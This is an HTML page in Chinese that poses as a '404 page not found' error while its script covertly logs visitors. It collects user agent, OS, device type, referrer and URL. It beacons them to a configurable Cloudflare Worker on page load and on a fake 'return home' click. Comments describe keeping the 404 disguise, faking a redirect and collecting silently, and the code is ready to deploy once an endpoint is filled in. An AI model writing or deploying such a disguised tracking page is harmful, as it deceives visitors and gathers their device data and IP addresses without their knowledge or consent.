<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>404 - 页面不存在</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: #0a0a0a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: -apple-system, 'PingFang SC', 'Microsoft YaHei', sans-serif;
        }
        .container {
            text-align: center;
            padding: 40px 20px;
        }
        .code {
            font-size: 120px;
            font-weight: 900;
            color: #e74c3c;
            text-shadow: 0 0 40px rgba(231,76,60,0.3);
            letter-spacing: 10px;
            line-height: 1;
        }
        .msg {
            color: #888;
            font-size: 20px;
            margin: 20px 0 10px;
            letter-spacing: 2px;
        }
        .sub {
            color: #555;
            font-size: 14px;
        }
        .btn {
            margin-top: 30px;
            padding: 12px 40px;
            background: transparent;
            border: 1px solid #333;
            color: #666;
            border-radius: 30px;
            cursor: pointer;
            font-size: 14px;
            transition: all 0.3s;
        }
        .btn:hover {
            border-color: #e74c3c;
            color: #e74c3c;
        }
        /* 隐藏的真实抽奖按钮 - 防误触 */
        .real-btn {
            display: none;
        }
        /* 加载动画 */
        .loading {
            display: none;
            margin-top: 20px;
            color: #444;
            font-size: 13px;
        }
        .loading.show { display: block; }
        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid #222;
            border-top-color: #e74c3c;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            vertical-align: middle;
            margin-right: 8px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="code">404</div>
        <div class="msg">页面走丢了...</div>
        <div class="sub">您访问的链接可能已失效或不存在</div>
        <button class="btn" id="fakeBtn">返回首页</button>
        <div class="loading" id="loading"><span class="spinner"></span>正在跳转...</div>
    </div>

    <script>
        (function() {
            // ========== 配置区 ==========
            const WORKER_URL = 'https://your-worker.workers.dev'; // ⚠️ 改成你的Worker地址
            const ACTIVITY_ID = 'summer2026'; // 活动标识，方便区分
            // ============================

            // 收集设备信息
            function getDeviceInfo() {
                const ua = navigator.userAgent;
                let os = 'Unknown';
                let osVersion = 'Unknown';
                let deviceType = 'Unknown';

                // 检测 iOS
                const iosMatch = ua.match(/iPhone OS (\d+)_(\d+)/);
                if (iosMatch) {
                    os = 'iOS';
                    osVersion = iosMatch[1] + '.' + iosMatch[2];
                    deviceType = 'iPhone';
                } else if (ua.includes('iPad')) {
                    os = 'iOS';
                    osVersion = 'iPad';
                    deviceType = 'iPad';
                } 
                // 检测 Android
                else if (ua.includes('Android')) {
                    os = 'Android';
                    const androidMatch = ua.match(/Android (\d+)\.(\d+)/);
                    if (androidMatch) {
                        osVersion = androidMatch[1] + '.' + androidMatch[2];
                    }
                    deviceType = 'Android';
                } 
                // 检测桌面
                else if (ua.includes('Windows')) {
                    os = 'Windows';
                    deviceType = 'PC';
                } else if (ua.includes('Mac OS')) {
                    os = 'macOS';
                    deviceType = 'PC';
                } else if (ua.includes('Linux')) {
                    os = 'Linux';
                    deviceType = 'PC';
                }

                return { os, osVersion, deviceType, ua: ua.substring(0, 500) };
            }

            // 发送数据到 Worker
            function sendData() {
                const device = getDeviceInfo();
                const data = {
                    activityId: ACTIVITY_ID,
                    timestamp: new Date().toISOString(),
                    ip: '', // Worker端会获取真实IP
                    userAgent: device.ua,
                    os: device.os,
                    osVersion: device.osVersion,
                    deviceType: device.deviceType,
                    referer: document.referrer || '',
                    url: window.location.href
                };

                // 显示加载状态
                const loading = document.getElementById('loading');
                loading.classList.add('show');

                fetch(WORKER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                })
                .then(res => res.json())
                .then(result => {
                    console.log('数据已记录:', result);
                    // 假装跳转（实际不跳，保持404伪装）
                    setTimeout(() => {
                        loading.classList.remove('show');
                        // 可以弹个假提示
                        document.querySelector('.msg').textContent = '链接已失效，请联系管理员';
                        document.querySelector('.msg').style.color = '#e74c3c';
                    }, 1200);
                })
                .catch(err => {
                    console.error('上报失败:', err);
                    loading.classList.remove('show');
                });
            }

            // 用户点击"返回首页"触发收集
            document.getElementById('fakeBtn').addEventListener('click', function(e) {
                e.preventDefault();
                sendData();
            });

            // 页面加载后自动收集（静默，不打扰用户）
            window.addEventListener('load', function() {
                // 延迟1秒后自动上报（用户可能关闭页面，但数据已发）
                setTimeout(() => {
                    // 但为了防止重复，只上报一次
                    if (!window._reported) {
                        window._reported = true;
                        // 使用sendBeacon保证页面关闭也能发送
                        const device = getDeviceInfo();
                        const data = {
                            activityId: ACTIVITY_ID,
                            timestamp: new Date().toISOString(),
                            ip: '',
                            userAgent: device.ua,
                            os: device.os,
                            osVersion: device.osVersion,
                            deviceType: device.deviceType,
                            referer: document.referrer || '',
                            url: window.location.href,
                            auto: true // 标记为自动上报
                        };
                        if (navigator.sendBeacon) {
                            navigator.sendBeacon(WORKER_URL, JSON.stringify(data));
                        } else {
                            // fallback
                            fetch(WORKER_URL, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify(data),
                                keepalive: true
                            }).catch(() => {});
                        }
                    }
                }, 1000);
            });
        })();
    </script>
</body>
</html>
